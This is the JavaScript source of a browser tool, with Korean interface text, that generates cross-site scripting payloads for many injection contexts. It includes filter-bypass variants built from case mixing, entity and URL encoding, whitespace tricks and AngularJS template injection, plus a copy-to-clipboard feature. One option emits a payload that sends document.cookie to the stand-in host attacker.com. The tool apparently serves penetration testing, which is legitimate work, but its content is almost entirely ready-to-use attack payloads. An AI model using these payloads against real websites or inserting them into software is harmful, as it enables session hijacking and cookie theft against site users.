    function getJS() {
      const sink = document.getElementById('sink').value;
      if (sink === 'alert') return 'alert(1)';
      if (sink === 'cookie') return "fetch('https://attacker.com/?c='+document.cookie)";
      return document.getElementById('customPayload').value || 'alert(1)';
    }

    function safeGenerateXSSPayloads() {
      try {
        generateXSSPayloads();
      } catch (e) {
        const list = document.getElementById('payloadList');
        document.getElementById('countBadge').textContent = '0';
        list.replaceChildren(makeEmptyState(`생성 중 오류가 발생했습니다. ${e.message}`));
      }
    }

    function generate() {
      safeGenerateXSSPayloads();
    }

    function generateXSSPayloads() {
      const ctx  = document.getElementById('ctx').value;
      const js   = getJS();
      const fCase   = document.getElementById('f_case').checked;
      const fEncode = document.getElementById('f_encode').checked;
      const fScript = document.getElementById('f_script').checked;
      const fSpace  = document.getElementById('f_space').checked;
      const fEvt    = document.getElementById('f_evt').checked;
      const fProto  = document.getElementById('f_proto').checked;
      const fAngular= document.getElementById('f_angular').checked;

      const payloads = [];

      const add = (code, note, tags=[]) => payloads.push({ code, note, tags });

      const sp = fSpace ? '/**/' : ' ';
      const scriptOpen = '<scr' + 'ipt>';
      const scriptClose = '</scr' + 'ipt>';

      // Context-specific base payloads
      if (ctx === 'html_body') {
        add(`${scriptOpen}${js}${scriptClose}`, '기본 script 태그', ['basic']);
        add(`<img src=x onerror="${js}">`, 'img onerror 이벤트', ['basic']);
        add(`<svg onload="${js}">`, 'SVG onload', ['basic']);
        add(`<body onload="${js}">`, 'body onload', ['basic']);
        add(`<iframe src="javascript:${js}">`, 'iframe javascript: URI', ['basic']);
        if (fScript) {
          add(`<ScRiPt>${js}<\/sCrIpT>`, '대소문자 혼합 script', ['bypass']);
          add(`<img src=x oNeRrOr="${js}">`, '대소문자 혼합 이벤트', ['bypass']);
          add(`<svg/onload="${js}">`, 'SVG 슬래시 구분자', ['bypass']);
          add(`<details/open/ontoggle="${js}">`, 'details ontoggle 이벤트', ['bypass']);
          add(`<input autofocus onfocus="${js}">`, 'input autofocus onfocus', ['bypass']);
          add(`<select onfocus="${js}" autofocus>`, 'select autofocus', ['bypass']);
          add(`<video src=1 onerror="${js}">`, 'video onerror', ['bypass']);
          add(`<math><mtext></math>${scriptOpen}${js}${scriptClose}`, 'MathML 이후 script', ['bypass']);
          add(`<table><td>${scriptOpen}${js}${scriptClose}`, 'table 내부 script', ['bypass']);
        }
        if (fEncode) {
          add(`&#x3C;img src=x onerror=&#x22;${js}&#x22;&#x3E;`, 'HTML hex 엔티티 인코딩', ['bypass', 'encode']);
          add(`&lt;img src=x onerror=&quot;${js}&quot;&gt;`, 'HTML named 엔티티', ['bypass', 'encode']);
        }
        if (fAngular) {
          add(`{{constructor.constructor('${js}')()}}`, 'AngularJS template injection (v1)', ['bypass', 'angular']);
          add(`{{$on.constructor('${js}')()}}`, 'AngularJS $on.constructor', ['bypass', 'angular']);
          add(`<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>`, 'AngularJS ng-csp bypass', ['bypass', 'angular']);
        }
      }

      if (ctx === 'html_attr_dq') {
        add(`">${scriptOpen}${js}${scriptClose}`, '따옴표 탈출 후 script 삽입', ['basic']);
        add(`" onerror="${js}" x="`, 'onerror 삽입', ['basic']);
        add(`"><img src=x onerror="${js}">`, '태그 닫고 새 태그', ['basic']);
        add(`"><svg onload="${js}">`, 'SVG 삽입', ['basic']);
        if (fCase) add(`" OnErRoR="${js}" x="`, '이벤트 대소문자 우회', ['bypass']);
        if (fSpace) add(`"${sp}onerror="${js}"${sp}x="`, '공백 우회 (주석)', ['bypass']);
      }

      if (ctx === 'html_attr_sq') {
        add(`'>${scriptOpen}${js}${scriptClose}`, '홑따옴표 탈출', ['basic']);
        add(`' onerror='${js}' x='`, 'onerror 삽입', ['basic']);
        add(`'><img src=x onerror='${js}'>`, '태그 닫고 삽입', ['basic']);
        if (fCase) add(`' OnErRoR='${js}' x='`, '이벤트 대소문자 우회', ['bypass']);
      }

      if (ctx === 'html_attr_unquoted') {
        add(`x onerror=${js} y=`, '따옴표 없는 속성 탈출', ['basic']);
        add(`>${scriptOpen}${js}${scriptClose}`, '태그 닫기 후 script', ['basic']);
        if (fSpace) add(`x\tonerror=${js}\ty=`, 'Tab 공백 우회', ['bypass']);
        if (fSpace) add(`x\nonerror=${js}\ny=`, '줄바꿈 공백 우회', ['bypass']);
      }

      if (ctx === 'js_string_dq') {
        add(`"-${js}-"`, '따옴표 닫기 후 JS 삽입', ['basic']);
        add(`";${js};//`, '세미콜론 탈출', ['basic']);
        add(`\\"-(${js})-\\"`, '이스케이프 슬래시 우회', ['bypass']);
        if (fEncode) add(`\\u0022;${js};//`, 'Unicode 이스케이프 따옴표', ['bypass', 'encode']);
        add(`"+${js}+"`, '문자열 연결 삽입', ['basic']);
      }

      if (ctx === 'js_string_sq') {
        add(`'-${js}-'`, '홑따옴표 탈출', ['basic']);
        add(`';${js};//`, '세미콜론 탈출', ['basic']);
        add(`\\'-${js}-\\'`, '이스케이프 슬래시 우회', ['bypass']);
        if (fEncode) add(`\\u0027;${js};//`, 'Unicode 이스케이프 따옴표', ['bypass', 'encode']);
      }

      if (ctx === 'js_template') {
        add(`\`-${js}-\``, '백틱 탈출', ['basic']);
        add(`\${${js}}`, '템플릿 표현식 직접 삽입', ['basic']);
        add(`\`;\`+${js}//`, '세미콜론 탈출', ['basic']);
      }

      if (ctx === 'url_param') {
        add(`javascript:${js}`, 'javascript: 프로토콜 (href/src)', ['basic']);
        add(`data:text/html,${scriptOpen}${js}${scriptClose}`, 'data: URI (src 속성)', ['basic']);
        if (fProto) {
          add(`JaVaScRiPt:${js}`, 'javascript: 대소문자 우회', ['bypass']);
          add(`javascript\t:${js}`, 'Tab 삽입 우회', ['bypass']);
          add(`javascript:/*\n*/${js}`, '줄바꿈 삽입 우회', ['bypass']);
          add(`javas&#x63;ript:${js}`, '엔티티 인코딩 우회', ['bypass', 'encode']);
          add(`%6Aavascript:${js}`, 'URL 인코딩 우회', ['bypass', 'encode']);
        }
      }

      if (ctx === 'svg') {
        add(`<svg onload="${js}">`, 'SVG onload', ['basic', 'ctx']);
        add(`<svg>${scriptOpen}${js}${scriptClose}</svg>`, 'SVG 내 script', ['basic', 'ctx']);
        add(`<svg><animate onbegin="${js}" attributeName=x dur=1s>`, 'animate onbegin', ['basic', 'ctx']);
        add(`<svg><set onbegin="${js}">`, 'set onbegin', ['basic', 'ctx']);
        add(`<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'>${scriptOpen}${js}${scriptClose}</svg>#x">`, 'SVG use href data:', ['bypass', 'ctx']);
        if (fCase) add(`<SVG ONLOAD="${js}">`, '대문자 SVG/ONLOAD', ['bypass', 'ctx']);
      }

      if (ctx === 'comment') {
        add(`-->${scriptOpen}${js}${scriptClose}<!--`, '주석 탈출 후 script', ['basic']);
        add(`--><img src=x onerror="${js}"><!--`, '주석 탈출 후 img', ['basic']);
        add(`--!>${scriptOpen}${js}${scriptClose}<!--`, '--!> 방식 주석 탈출', ['bypass']);
      }

      // 이벤트 필터 우회 공통 추가
      if (fEvt && (ctx === 'html_body' || ctx === 'html_attr_dq' || ctx === 'html_attr_sq')) {
        add(`<video><source onerror="${js}">`, 'source onerror', ['bypass']);
        add(`<audio src=x onerror="${js}">`, 'audio onerror', ['bypass']);
        add(`<body onpageshow="${js}">`, 'body onpageshow', ['bypass']);
        add(`<marquee onstart="${js}">`, 'marquee onstart', ['bypass']);
        add(`<isindex type=image src=1 onerror="${js}">`, 'isindex onerror (IE)', ['bypass']);
        add(`<object data="javascript:${js}">`, 'object data javascript:', ['bypass']);
        add(`<form><button formaction="javascript:${js}">click</button></form>`, 'button formaction', ['bypass']);
      }

      // 렌더링
      const list = document.getElementById('payloadList');
      document.getElementById('countBadge').textContent = payloads.length;
      updateStatus(ctx, document.getElementById('sink').value, payloads.length);

      if (payloads.length === 0) {
        list.replaceChildren(makeEmptyState('해당 설정으로 생성된 페이로드가 없습니다.'));
        return;
      }

      list.replaceChildren(...payloads.map((p, i) => makePayloadCard(p, i)));

      window._payloads = payloads;
    }

    window.safeGenerateXSSPayloads = safeGenerateXSSPayloads;
    window.generateXSSPayloads = generateXSSPayloads;
    window.generate = generate;

    function copyPayload(i) {
      navigator.clipboard.writeText(window._payloads[i].code).then(() => {
        showToast();
      });
    }

    function makePayloadCard(payload, index) {
      const card = document.createElement('div');
      card.className = 'payload-card';

      const top = document.createElement('div');
      top.className = 'payload-top';

      const meta = document.createElement('div');
      meta.className = 'payload-meta';
      payload.tags.forEach(tag => {
        const badge = document.createElement('span');
        badge.className = `tag tag-${tag === 'bypass' || tag === 'encode' || tag === 'angular' ? 'bypass' : tag === 'ctx' ? 'ctx' : 'basic'}`;
        badge.textContent = tag;
        meta.appendChild(badge);
      });

      const copy = document.createElement('button');
      copy.className = 'btn-copy';
      copy.type = 'button';
      copy.textContent = 'Copy';
      copy.addEventListener('click', () => copyPayload(index));

      const code = document.createElement('div');
      code.className = 'payload-code';
      code.textContent = payload.code;

      const note = document.createElement('div');
      note.className = 'payload-note';
      note.textContent = payload.note;

      top.append(meta, copy);
      card.append(top, code, note);
      return card;
    }

    function makeEmptyState(message) {
      const div = document.createElement('div');
      div.className = 'empty-state';
      div.textContent = message;
      return div;
    }

    function updateStatus(ctx, sink, count) {
      const status = document.getElementById('xssStatus');
      if (!status) return;
      const checked = ['f_case','f_encode','f_script','f_space','f_evt','f_proto','f_angular']
        .filter(id => document.getElementById(id)?.checked)
        .map(id => document.querySelector(`label.check-item input#${id}`)?.parentElement?.textContent.trim())
        .filter(Boolean);
      status.textContent = `Context: ${ctx} / Sink: ${sink} / 필터: ${checked.length ? checked.join(', ') : '없음'} / ${count}개 생성`;
    }

    function escHtml(s) {
      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    function showToast() {
      let t = document.getElementById('toast');
      if (!t) {
        t = document.createElement('div');
        t.id = 'toast';
        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;background:#238636;color:#fff;padding:.6rem 1.2rem;border-radius:8px;font-size:.85rem;opacity:0;transition:opacity .3s;pointer-events:none';
        t.textContent = '복사 완료!';
        document.body.appendChild(t);
      }
      t.style.opacity = '1';
      setTimeout(() => { t.style.opacity = '0'; }, 1500);
    }

    function initXSSBuilder() {
      const sink = document.getElementById('sink');
      const btn = document.getElementById('generateBtn');
      const list = document.getElementById('payloadList');
      const controls = document.querySelectorAll('#ctx, #sink, #customPayload, #f_case, #f_encode, #f_script, #f_space, #f_evt, #f_proto, #f_angular');
      if (sink) {
        sink.addEventListener('change', function() {
          document.getElementById('customGroup').style.display = this.value === 'custom' ? 'block' : 'none';
        });
      }
      if (btn) btn.addEventListener('click', safeGenerateXSSPayloads);
      controls.forEach(control => {
        control.addEventListener('change', safeGenerateXSSPayloads);
        control.addEventListener('input', safeGenerateXSSPayloads);
      });
      if (list) {
        list.addEventListener('click', event => {
          const copy = event.target.closest('[data-copy]');
          if (!copy) return;
          navigator.clipboard.writeText(copy.getAttribute('data-copy')).then(showToast);
        });
      }
      safeGenerateXSSPayloads();
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initXSSBuilder);
    } else {
      initXSSBuilder();
    }
